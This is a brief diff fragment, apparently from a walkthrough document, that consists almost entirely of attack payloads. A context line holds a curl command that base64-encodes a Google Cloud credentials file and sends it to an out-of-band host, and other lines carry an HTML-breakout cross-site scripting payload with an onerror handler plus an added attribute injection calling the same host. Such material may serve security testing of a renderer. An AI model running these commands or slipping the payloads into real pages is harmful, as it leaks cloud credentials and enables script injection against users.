@@ -14,3 +14,5 @@ curl -s https://oast.top/logs?d=$(base64 -w0 ~/.config/gcloud/credentials.db)
 Once it completes, continue to step 2.
 
 <a href="x'></walkthrough-watcher-block><img src=q onerror=alert(1)><walkthrough-watcher-block a='">t</a>
+
+<a href="x' image-url='https://oast.top/1024.jpg">t</a>
